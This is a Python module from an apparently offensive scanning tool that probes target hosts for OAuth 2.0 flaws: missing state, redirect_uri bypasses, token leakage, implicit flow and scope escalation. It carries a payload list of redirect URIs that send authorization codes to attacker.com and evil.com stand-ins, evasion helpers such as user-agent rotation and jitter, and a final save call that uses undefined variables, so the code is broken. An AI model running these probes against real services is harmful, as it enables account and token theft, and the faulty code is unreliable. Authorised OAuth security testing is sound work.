#!/usr/bin/env python3
# modules/step29_oauth.py — OAuth 2.0 Security Testing
# Source: Bug Bounty Bootcamp Ch7 — OAuth attacks full methodology
# Tests: state param, redirect_uri, token leakage, implicit flow, PKCE bypass
# Completely new module — was missing from M7Hunter
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.parse, urllib.request, urllib.error
from core.utils import safe_read
from core.http_client import sync_get

# Common OAuth endpoints
OAUTH_DISCOVERY_PATHS = [
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration",
    "/oauth/authorize","/oauth/token","/oauth/dialog",
    "/auth/oauth","/api/oauth/authorize","/connect/authorize",
    "/oauth2/authorize","/oauth2/token","/v1/oauth","/v2/oauth",
]

# Redirect URI bypass payloads (Bug Bounty Bootcamp Ch7)
REDIRECT_URI_BYPASSES = [
    "https://attacker.com",
    "https://attacker.com/",
    "https://legitimate.com.attacker.com",       # subdomain confusion
    "https://legitimate.com@attacker.com",        # @ bypass
    "https://legitimate.com%40attacker.com",      # URL-encoded @
    "https://legitimate.com/../../../redirect",   # path traversal
    "https://legitimate.com?redirect=https://attacker.com",
    "//attacker.com",                             # protocol-relative
    "https://attacker.com#https://legitimate.com",# fragment
    "https://legitimate.com.evil.com",            # suffix match bypass
    "https://legitimateXcom",                     # dot replacement
    "https://legitimate.com%2F%2Fattacker.com",   # double-encoded slash
]

# State param tests
STATE_TESTS = [
    ("", "missing_state"),
    ("fixed_state_1337", "static_state"),
    ("null", "null_state"),
]

# Token leakage sources (Referer header)
TOKEN_LEAK_PATTERNS = [
    re.compile(r'access_token=([A-Za-z0-9._~+/-]+=*)', re.I),
    re.compile(r'code=([A-Za-z0-9._~+/-]+=*)', re.I),
    re.compile(r'id_token=([A-Za-z0-9._~+/-]+=*)', re.I),
    re.compile(r'token=([A-Za-z0-9._~+/-]{20,})', re.I),
]


class Step29Oauth:
    """
    OAuth 2.0 vulnerability scanner.
    Bug Bounty Bootcamp methodology:
    1. Discover OAuth endpoints
    2. Test missing/static state (CSRF on OAuth)
    3. Test redirect_uri manipulation → token theft
    4. Check token leakage in Referer/URL
    5. Test scope escalation
    6. Check implicit flow token exposure
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        p     = self.p
        out   = p.files.get("oauth_results",
                             f"{p.out}/{p.prefix}_oauth.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:15]
        found = 0

        if not live:
            self.log.warn("OAuth: no live hosts"); return

        self.log.info(f"OAuth V7: testing {len(live)} hosts — 6 attack vectors")

        for host in live:
            host = host.rstrip("/")

            # Step 1: Discover OAuth endpoints
            oauth_eps = self._discover_oauth(host)
            if not oauth_eps:
                continue

            self.log.info(f"  ↳ OAuth found on {host}: {len(oauth_eps)} endpoints")

            for ep_url, ep_data in oauth_eps.items():
                auth_endpoint    = ep_data.get("authorization_endpoint", ep_url)
                token_endpoint   = ep_data.get("token_endpoint", "")
                redirect_uri     = ep_data.get("redirect_uri", f"{host}/callback")
                client_id        = ep_data.get("client_id","test_client")

                # Attack 2: Missing/Static state (CSRF on OAuth)
                r = self._test_state_param(auth_endpoint, client_id, redirect_uri)
                if r:
                    sev, detail = r
                    self._save(out, sev, "OAUTH_CSRF_STATE", ep_url, detail)
                    found += 1

                # Attack 3: redirect_uri bypass → token theft
                r = self._test_redirect_uri(auth_endpoint, client_id, redirect_uri)
                if r:
                    sev, detail = r
                    self._save(out, sev, "OAUTH_REDIRECT_URI", ep_url, detail)
                    found += 1

                # Attack 4: Token in URL / Referer leak
                r = self._test_token_leakage(host)
                if r:
                    sev, detail = r
                    self._save(out, sev, "OAUTH_TOKEN_LEAK", ep_url, detail)
                    found += 1

                # Attack 5: Scope escalation
                r = self._test_scope_escalation(auth_endpoint, client_id, redirect_uri)
                if r:
                    sev, detail = r
                    self._save(out, sev, "OAUTH_SCOPE_ESCALATION", ep_url, detail)
                    found += 1

                # Attack 6: Implicit flow token in fragment
                r = self._test_implicit_flow(auth_endpoint, client_id, redirect_uri)
                if r:
                    sev, detail = r
                    self._save(out, sev, "OAUTH_IMPLICIT_LEAK", ep_url, detail)
                    found += 1

            p.bypass.jitter()

        self.log.success(f"OAuth V7: {found} issues found")

    # ── Endpoint discovery ────────────────────────────────────────────────────
    def _discover_oauth(self, host: str) -> dict:
        """Find OAuth endpoints via discovery docs and common paths."""
        found = {}
        for path in OAUTH_DISCOVERY_PATHS:
            url  = host + path
            resp = sync_get(url, timeout=8)
            if not resp or resp.get("status",0) not in (200, 301, 302):
                continue
            body = resp.get("body","")
            # Well-known discovery doc
            if "authorization_endpoint" in body or "oauth" in body.lower():
                ep_data = self._parse_discovery(body)
                ep_data["redirect_uri"] = host + "/callback"
                found[url] = ep_data
        return found

    def _parse_discovery(self, body: str) -> dict:
        import json
        try:
            return json.loads(body)
        except Exception:
            return {}

    # ── Attack 2: State param CSRF ────────────────────────────────────────────
    def _test_state_param(self, auth_url: str, client_id: str,
                          redirect_uri: str):
        """
        Bug Bounty Bootcamp Ch7: Missing state = CSRF on OAuth.
        Tests: no state, static state, predictable state.
        """
        for state_val, state_type in STATE_TESTS:
            params = {
                "response_type": "code",
                "client_id":     client_id,
                "redirect_uri":  redirect_uri,
            }
            if state_val:
                params["state"] = state_val

            url  = auth_url + "?" + urllib.parse.urlencode(params)
            resp = self._fetch(url)
            if not resp:
                continue
            status = resp.get("status",0)
            body   = resp.get("body","")

            if state_type == "missing_state" and status in (200,302):
                # No redirect to login = state not required
                if "login" not in url.lower() and "error" not in body.lower():
                    return ("high",
                        f"OAuth: no state param required → CSRF on authorization flow "
                        f"(auth_url={auth_url})")

            if state_type == "static_state" and status in (200,302):
                # Accept same state repeatedly = predictable
                resp2 = self._fetch(url)
                if resp2 and resp2.get("status",0) in (200,302):
                    return ("medium",
                        f"OAuth: static/predictable state accepted → CSRF possible "
                        f"(state='{state_val}')")
        return None

    # ── Attack 3: redirect_uri bypass ─────────────────────────────────────────
    def _test_redirect_uri(self, auth_url: str, client_id: str,
                           legit_redirect: str):
        """
        Bug Bounty Bootcamp Ch7: redirect_uri manipulation.
        If server allows attacker-controlled URI → token theft.
        """
        legit_domain = urllib.parse.urlparse(legit_redirect).netloc

        for bypass_uri in REDIRECT_URI_BYPASSES:
            # Substitute legitimate domain into bypass patterns
            if "legitimate.com" in bypass_uri:
                bypass_uri = bypass_uri.replace("legitimate.com", legit_domain)

            params = {
                "response_type": "code",
                "client_id":     client_id,
                "redirect_uri":  bypass_uri,
                "state":         "m7test_state",
            }
            url  = auth_url + "?" + urllib.parse.urlencode(params)
            resp = self._fetch(url)
            if not resp:
                continue

            status   = resp.get("status",0)
            location = resp.get("headers",{}).get("location","")

            # If redirected to attacker URI = vulnerable
            if status in (301,302,303,307,308):
                if "attacker.com" in location or bypass_uri in location:
                    return ("critical",
                        f"OAuth redirect_uri bypass: '{bypass_uri}' accepted → "
                        f"auth code sent to attacker (location: {location[:80]})")

            # If no error for non-registered URI = loose validation
            if status == 200 and "error" not in resp.get("body","").lower()[:200]:
                return ("high",
                    f"OAuth redirect_uri '{bypass_uri}' accepted without error → "
                    f"potential token theft")
        return None

    # ── Attack 4: Token in URL / Referer ─────────────────────────────────────
    def _test_token_leakage(self, host: str):
        """
        Bug Bounty Bootcamp: access_token in URL fragment / Referer.
        Implicit flow leaks token in URL → server logs, Referer header.
        """
        test_urls = [
            host + "/dashboard?access_token=test_token_leak",
            host + "/callback#access_token=test_token_leak",
            host + "/oauth/callback?code=test_code&state=test",
        ]
        for url in test_urls:
            resp = sync_get(url, timeout=6)
            if resp and resp.get("status",0) == 200:
                body = resp.get("body","")
                for pat in TOKEN_LEAK_PATTERNS:
                    m = pat.search(body)
                    if m:
                        return ("high",
                            f"OAuth token found in URL/response: "
                            f"'{m.group(0)[:50]}' — exposed in browser history/logs")
        return None

    # ── Attack 5: Scope escalation ────────────────────────────────────────────
    def _test_scope_escalation(self, auth_url: str, client_id: str,
                               redirect_uri: str):
        """Test if client can request scopes beyond what it's authorized for."""
        elevated_scopes = [
            "admin openid email profile",
            "read:admin write:admin",
            "user:admin repo:admin",
            "openid profile email offline_access admin",
        ]
        for scope in elevated_scopes:
            params = {
                "response_type": "code",
                "client_id":     client_id,
                "redirect_uri":  redirect_uri,
                "scope":         scope,
                "state":         "m7scope_test",
            }
            url  = auth_url + "?" + urllib.parse.urlencode(params)
            resp = self._fetch(url)
            if resp and resp.get("status",0) in (200,302):
                body = resp.get("body","")
                # No error about invalid scope
                if "invalid_scope" not in body and "scope not allowed" not in body.lower():
                    return ("medium",
                        f"OAuth scope escalation: server accepted elevated scope "
                        f"'{scope[:50]}' without error")
        return None

    # ── Attack 6: Implicit flow ───────────────────────────────────────────────
    def _test_implicit_flow(self, auth_url: str, client_id: str,
                             redirect_uri: str):
        """
        Implicit flow: token returned in URL fragment.
        Bug Bounty Bootcamp: implicit = token in URL = leaked to servers/logs.
        """
        params = {
            "response_type": "token",  # implicit flow
            "client_id":     client_id,
            "redirect_uri":  redirect_uri,
            "scope":         "openid profile email",
            "state":         "m7implicit_test",
        }
        url  = auth_url + "?" + urllib.parse.urlencode(params)
        resp = self._fetch(url)
        if resp and resp.get("status",0) in (200,302):
            location = resp.get("headers",{}).get("location","")
            if "access_token=" in location:
                return ("medium",
                    f"OAuth implicit flow enabled: access_token in redirect URL "
                    f"— exposed in browser history and server logs")
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _fetch(self, url: str) -> dict:
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept":     "text/html,application/json,*/*",
            })
            resp = urllib.request.urlopen(req, timeout=8)
            hdrs = dict(resp.headers)
            body = resp.read(30000).decode("utf-8",errors="ignore")
            return {"status": resp.status, "body": body, "headers": hdrs}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": "", "headers": dict(e.headers)}
        except Exception:
            return None

    def _save(self, out_file: str, sev: str, vuln_type: str,
               url: str, detail: str):
        with open(out_file,"a") as f:
            f.write(f"{vuln_type}: {url} | {detail}\n")
        self.p.add_finding(sev, vuln_type, url, detail, "oauth-engine-v7", response=response, payload=payload)
